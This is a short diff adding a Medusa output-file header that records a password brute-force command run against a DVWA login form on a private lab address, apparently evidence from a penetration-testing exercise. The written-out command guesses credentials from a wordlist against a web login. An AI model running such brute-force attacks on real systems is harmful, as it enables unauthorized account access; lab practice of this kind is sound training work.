@@ -1,0 +1,3 @@
+# Medusa v.2.3 (2025-11-24 07:54:08)
+# medusa -h 192.168.0.3 -u admin -P wordlists/small-passwords.txt -M web-form -m FORM:/dvwa/login.php:username=^USER^&password=^PASS^:F=Login failed:S=Welcome -O evidence/dvwa_medusa_output.txt 
+# Medusa has finished (2025-11-24 07:54:08).
